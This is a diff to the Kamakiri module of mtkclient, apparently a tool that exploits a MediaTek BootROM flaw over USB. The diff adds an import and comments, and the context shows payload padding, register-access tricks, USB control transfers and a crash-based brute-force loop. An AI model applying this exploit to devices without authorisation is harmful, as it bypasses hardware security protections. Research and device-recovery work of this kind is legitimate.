@@ -6,7 +6,7 @@ import array
 import time
 import os
 from struct import pack, unpack
-from mtkclient.Library.utils import LogBase, print_progress, revdword, logsetup
+from mtkclient.Library.utils import LogBase, print_progress, revdword, logsetup, getint
 from mtkclient.Library.Connection.usblib import usb
 from mtkclient.config.payloads import pathconfig
 
@@ -32,7 +32,7 @@ class Kamakiri(metaclass=LogBase):
         while len(payload) % 4 != 0:
             payload.append(0)
         if da:
-            payload.extend(b"\x00" * 0x100)
+            payload.extend(b"\x00" * 0x100)  # signature len
         return payload
 
     def exploit(self, payload, payloadaddr):
@@ -91,23 +91,27 @@ class Kamakiri(metaclass=LogBase):
             ptr_da = self.mtk.config.chipconfig.brom_register_access[0][1]
         if ptr_da is None:
             assert "Unknown cpu config. Please try to dump brom and send to the author"
+        # 0x40404000
         for i in range(3):
             self.kamakiri2(ptr_da + 8 - 3 + i)
 
         if address < 0x40:
+            # 0x0
             for i in range(4):
                 self.kamakiri2(ptr_da - 6 + (4 - i))
             return self.mtk.preloader.brom_register_access(address, length, data, check_result)
         else:
+            # 0x00000040
             for i in range(3):
                 self.kamakiri2(ptr_da - 5 + (3 - i))
             return self.mtk.preloader.brom_register_access(address - 0x40, length, data, check_result)
 
     def exploit2(self, payload, payloadaddr=None):
+        # noinspection PyProtectedMember
         if payloadaddr is None:
             payloadaddr = self.chipconfig.brom_payload_addr
         try:
-            # noinspection PyProtectedMember
+            # self.mtk.port.cdc.device.reset()
             if self.linecode is None:
                 self.linecode = self.mtk.port.cdc.device.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])
             ptr_send = unpack("<I", self.da_read(self.mtk.config.chipconfig.send_ptr[0][1], 4))[0] + 8
@@ -149,6 +153,7 @@ class Kamakiri(metaclass=LogBase):
     def bruteforce2(self, args, startaddr=0x9900):
         found = False
         while not found:
+            # self.mtk.init()
             self.mtk.preloader.display = False
             if self.mtk.preloader.init(display=False):
                 self.mtk = self.mtk.crasher(display=False)
